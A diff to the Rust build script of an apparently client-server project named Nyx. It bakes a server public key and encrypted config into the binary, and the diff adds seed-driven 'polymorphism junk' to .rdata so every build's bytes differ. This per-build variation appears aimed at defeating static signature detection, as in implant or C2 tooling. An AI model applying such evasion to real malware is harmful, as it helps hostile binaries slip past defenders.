@@ -20,6 +20,12 @@
 //!    here on the host. So every rebuild re-randomizes the key/nonce even if
 //!    the config values are identical — the static bytes (and surrounding
 //!    instruction layout) differ per build.
+//!
+//! 3. **L3 non-executable polymorphism junk** (`OUT_DIR/poly_junk.rs`) — see
+//!    `bake_poly_junk`. When `NYX_BUILD_SEED` is set, emits a `#[used]` static
+//!    byte array into `.rdata` (read-only), filled from the seed via splitmix64.
+//!    Unset → empty include so default templates stay stable. Invalid seed
+//!    fails the build (no silent fallback). Never an executable section.
 
 use std::env;
 use std::fs;
@@ -36,9 +42,11 @@ fn main() {
     println!("cargo:rerun-if-env-changed=NYX_SERVER_PUB");
     println!("cargo:rerun-if-env-changed=NYX_CONFIG");
     println!("cargo:rerun-if-env-changed=NYX_CONFIG_KEY");
+    println!("cargo:rerun-if-env-changed=NYX_BUILD_SEED");
 
     bake_server_pub();
     bake_config();
+    bake_poly_junk();
 }
 
 // ---- 1. server pubkey -----------------------------------------------------
@@ -463,4 +471,24 @@ fn parse_hex_key(s: &str) -> Result<[u8; 32], String> {
         key[i] = (hi << 4) | lo;
     }
     Ok(key)
+}
+
+// ---- 3. L3 non-executable rdata junk --------------------------------------
+
+/// Emit `OUT_DIR/poly_junk.rs`. Unset seed → comment-only file (no static).
+/// Invalid seed panics the build (fail-closed; never fat-LTO fallback).
+fn bake_poly_junk() {
+    let dest = Path::new(&env::var("OUT_DIR").unwrap()).join("poly_junk.rs");
+    let src = match env::var("NYX_BUILD_SEED") {
+        Err(env::VarError::NotPresent) => nyx_config::poly::L3_JUNK_OMITTED_SOURCE.to_owned(),
+        Err(env::VarError::NotUnicode(_)) => {
+            panic!("NYX_BUILD_SEED is not valid UTF-8 (fail-closed)");
+        }
+        Ok(raw) => {
+            nyx_config::poly::l3_junk_rust_source_from_seed_var(Some(&raw)).unwrap_or_else(|e| {
+                panic!("NYX_BUILD_SEED: {e} (fail-closed; refusing to build)");
+            })
+        }
+    };
+    fs::write(&dest, src).unwrap();
 }
